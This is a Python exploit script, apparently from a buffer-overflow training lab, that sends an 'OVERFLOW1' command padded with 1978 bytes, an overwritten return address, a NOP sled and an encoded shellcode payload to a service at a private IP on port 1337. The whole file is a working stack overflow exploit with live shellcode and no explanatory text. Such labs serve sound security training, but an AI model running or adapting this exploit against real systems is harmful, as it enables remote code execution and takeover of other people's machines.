import socket
from pwn import p32

ip = "10.10.163.123"
port = 1337

retn = p32(0x625011AF)
prefix = b"OVERFLOW1 "
offset = 1978
overflow = b"A" * offset
padding = 16*b"\x90"
buf = b""
buf += b"\xda\xd9\xd9\x74\x24\xf4\x5f\xbd\xa5\x35\x38\xa9\x2b"
buf += b"\xc9\xb1\x52\x31\x6f\x17\x83\xc7\x04\x03\xca\x26\xda"
buf += b"\x5c\xe8\xa1\x98\x9f\x10\x32\xfd\x16\xf5\x03\x3d\x4c"
buf += b"\x7e\x33\x8d\x06\xd2\xb8\x66\x4a\xc6\x4b\x0a\x43\xe9"
buf += b"\xfc\xa1\xb5\xc4\xfd\x9a\x86\x47\x7e\xe1\xda\xa7\xbf"
buf += b"\x2a\x2f\xa6\xf8\x57\xc2\xfa\x51\x13\x71\xea\xd6\x69"
buf += b"\x4a\x81\xa5\x7c\xca\x76\x7d\x7e\xfb\x29\xf5\xd9\xdb"
buf += b"\xc8\xda\x51\x52\xd2\x3f\x5f\x2c\x69\x8b\x2b\xaf\xbb"
buf += b"\xc5\xd4\x1c\x82\xe9\x26\x5c\xc3\xce\xd8\x2b\x3d\x2d"
buf += b"\x64\x2c\xfa\x4f\xb2\xb9\x18\xf7\x31\x19\xc4\x09\x95"
buf += b"\xfc\x8f\x06\x52\x8a\xd7\x0a\x65\x5f\x6c\x36\xee\x5e"
buf += b"\xa2\xbe\xb4\x44\x66\x9a\x6f\xe4\x3f\x46\xc1\x19\x5f"
buf += b"\x29\xbe\xbf\x14\xc4\xab\xcd\x77\x81\x18\xfc\x87\x51"
buf += b"\x37\x77\xf4\x63\x98\x23\x92\xcf\x51\xea\x65\x2f\x48"
buf += b"\x4a\xf9\xce\x73\xab\xd0\x14\x27\xfb\x4a\xbc\x48\x90"
buf += b"\x8a\x41\x9d\x37\xda\xed\x4e\xf8\x8a\x4d\x3f\x90\xc0"
buf += b"\x41\x60\x80\xeb\x8b\x09\x2b\x16\x5c\x3c\xa5\x18\x34"
buf += b"\x28\xb7\x18\x55\xf5\x3e\xfe\x3f\x15\x17\xa9\xd7\x8c"
buf += b"\x32\x21\x49\x50\xe9\x4c\x49\xda\x1e\xb1\x04\x2b\x6a"
buf += b"\xa1\xf1\xdb\x21\x9b\x54\xe3\x9f\xb3\x3b\x76\x44\x43"
buf += b"\x35\x6b\xd3\x14\x12\x5d\x2a\xf0\x8e\xc4\x84\xe6\x52"
buf += b"\x90\xef\xa2\x88\x61\xf1\x2b\x5c\xdd\xd5\x3b\x98\xde"
buf += b"\x51\x6f\x74\x89\x0f\xd9\x32\x63\xfe\xb3\xec\xd8\xa8"
buf += b"\x53\x68\x13\x6b\x25\x75\x7e\x1d\xc9\xc4\xd7\x58\xf6"
buf += b"\xe9\xbf\x6c\x8f\x17\x20\x92\x5a\x9c\x40\x71\x4e\xe9"
buf += b"\xe8\x2c\x1b\x50\x75\xcf\xf6\x97\x80\x4c\xf2\x67\x77"
buf += b"\x4c\x77\x6d\x33\xca\x64\x1f\x2c\xbf\x8a\x8c\x4d\xea"


buffer = prefix + overflow + retn + padding + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer)
    print("Done!")
except socket.error as e:
    print("Could not connect.")
